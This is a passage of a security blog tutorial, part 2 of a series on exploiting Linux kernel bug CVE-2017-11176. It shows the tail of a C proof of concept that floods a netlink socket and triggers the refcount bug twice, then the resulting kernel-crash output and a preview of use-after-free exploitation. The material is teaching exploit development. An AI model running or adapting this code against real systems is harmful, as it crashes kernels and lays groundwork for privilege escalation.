<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] netlink socket bound (nl_pid=%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">.</span><span class="n">nl_pid</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_setsockopt</span><span class="p">(</span><span class="n">recv_fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_SOCKET</span><span class="p">,</span><span class="w"> </span><span class="n">SO_RCVBUF</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">new_size</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">new_size</span><span class="p">)))</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] setsockopt"</span><span class="p">);</span><span class="w"> </span><span class="c1">// no worry if it fails, it is just an optim.</span>
<span class="w">  </span><span class="k">else</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] receive buffer reduced</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] flooding socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">_sendmsg</span><span class="p">(</span><span class="n">send_fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">mhdr</span><span class="p">,</span><span class="w"> </span><span class="n">MSG_DONTWAIT</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">errno</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">EAGAIN</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] sendmsg"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] flood completed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">_close</span><span class="p">(</span><span class="n">send_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] blocking socket ready</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">recv_fd</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to prepare block socket</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="c1">// ============================================================================</span>
<span class="c1">// ----------------------------------------------------------------------------</span>
<span class="c1">// ============================================================================</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">unblock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] -={ CVE-2017-11176 Exploit }=-</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prepare_blocking_socket</span><span class="p">())</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] netlink socket created = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(((</span><span class="n">unblock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_dup</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">((</span><span class="n">sock_fd2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_dup</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] dup"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">sock_fd2</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// trigger the bug twice</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">decrease_sock_refcounter</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"></span>
<span class="w">      </span><span class="n">decrease_sock_refcounter</span><span class="p">(</span><span class="n">sock_fd2</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] ready to crash?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="c1">// TODO: exploit</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] exploit failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="c1">// ============================================================================</span>
<span class="c1">// ----------------------------------------------------------------------------</span>
<span class="c1">// ============================================================================</span>
</code></pre></div><p>The expected output is:</p><div class="highlight"><pre><span></span><code>[ ] -={ CVE-2017-11176 Exploit }=-
[ ] preparing blocking netlink socket
[+] socket created (send_fd = 3, recv_fd = 4)
[+] netlink socket bound (nl_pid=118)
[+] receive buffer reduced
[ ] flooding socket
[+] flood completed
[+] blocking socket ready
[+] netlink socket created = 4
[+] netlink fd duplicated (unblock_fd=3, sock_fd2=5)
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 4 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 5 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] ready to crash?
[ ] press key to continue...

&lt;&lt;&lt; KERNEL CRASH HERE &gt;&gt;&gt;
</code></pre></div><p>From now, up until the exploit is complete (i.e. kernel repaired), the system will <strong>constantly crash</strong> at each run. This is annoying but you will get used to it. You might want to speed up your boot time by removing all unnecessary services (e.g. graphical stuff, etc.). Remind to re-enable them later so you can match your "real" target (they <strong>do</strong> actually have an impact on the kernel).</p><hr><h1 id="conclusion">Conclusion</h1><p>This article introduced the scheduler subsystem, task state and how to transition between running/waiting state using wait queues. Understanding it allowed us to wake up the main thread and win the race condition.</p><p>With the help of the close() and a trick with dup() syscall, we forced the second call to fget() to return NULL, required to trigger the bug. Finally, we studied various ways to enter the "retry path" inside netlink_attachskb(), hence making it return 1.</p><p>All of this gives us the proof-of-concept code (using userland code only) that reliably triggers the bug without using System Tap anymore and makes the kernel crash.</p><p>The <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">next article</a> will cover an important topic: use-after-free exploitation. It will explain the basics of the slab allocator, type confusion, reallocation and how to use it to gain an <em>arbitrary call primitive</em>. Some new tools will be exposed that help building and debugging the exploit. In the end, we will make the kernel panic when <em>we want to</em>.</p></div><div class="blog-post-meta mt-4"><div class="share" id="post-share-links"><div class="share-twitter"><a href="https://twitter.com/intent/tweet?text=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%202/4%29&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-twitter fa-w-16" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i aria-hidden="true" class="fab fa-twitter"></i> -->Tweet</span></a></div><div class="share-facebook"><a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-facebook fa-w-14" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i aria-hidden="true" class="fab fa-facebook"></i> -->Share</span></a></div><div class="share-linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html&amp;title=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%202/4%29&amp;summary=In%20the%20second%20article%2C%20a%20ring-3%20PoC%20is%20built%20by%20removing%20each%20SystemTap%20script%20line%20one-by-one.%20It%20explains%20how%20to%20find%20and%20tailor%20syscalls%20to%20force%20the%20kernel%20into%20particular%20code%20paths%20as%20well%20as%20unconditionally%20win%20the%20race%20condition.%20The%20core%20concept%20section%20focuses%20on%20the%20scheduler%20subsystem%20%28task%20states%20and%20wait%20queues%29.&amp;source=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-linkedin fa-w-14" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i aria-hidden="true" class="fab fa-linkedin"></i> -->Share</span></a></div><div class="share-email"><a href="mailto:?subject=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%202/4%29&amp;body=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-envelope fa-w-16" data-prefix="far" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg><!-- <i aria-hidden="true" class="far fa-envelope"></i> -->Share</span></a></div></div></div></div></article></div></main><footer class="container-fluid bg-white"><div class="row py-2" style="background-color: rgb(179,32,39);"><div class="col-12 text-center footer-text"><h3 class="text-light">LEXFO - Because information security is essential</h3></div></div><div class="row"><div class="col-12 text-center mt-3"><h3 class="txtcenter">Contact us</h3></div></div><div class="row mt-3"><div class="col-sm-3 text-center"><img alt="Adresse" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 2_files/map.png"><h4>Our address</h4><address><p>5, rue Drouot<br> 75009 PARIS, FRANCE</p></address></div><div class="col-sm-3 text-center"><img alt="Email" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 2_files/email.png"><h4>By email</h4><p>contact [at] lexfo [dot] fr</p></div><div class="col-sm-3 text-center"><img alt="Téléphone" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 2_files/tel.png"><h4>By phone</h4><p>+33 1 40 17 91 28</p></div><div class="col-sm-3 text-center"><a href="https://twitter.com/LexfoSecurite" style="background: transparent;"><img alt="@LexfoSecurite, Lexfo&#39;s twitter account" class="mb-2" src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 2_files/twitter.png"></a><h4>On Twitter</h4><p><a href="https://twitter.com/LexfoSecurite">@LexfoSecurite</a></p></div></div><div class="row mt-1"><div class="col-12 text-center"><p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html#logo">Back to the top</a></p></div></div><div class="row mt-1"><div class="col-12 text-center"><p>© LEXFO 2020 - All rights reserved</p></div></div></footer><script src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 2_files/packed.js.下載"></script><script src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 2_files/all.min.js.下載"></script><script>
               $(document).ready(function () { $("table").attr("class","table table-condensed table-bordered"); });
               $(document).ready(function () { $("figcaption").attr("class","figcaption figure-caption text-center"); });
        </script></body></html>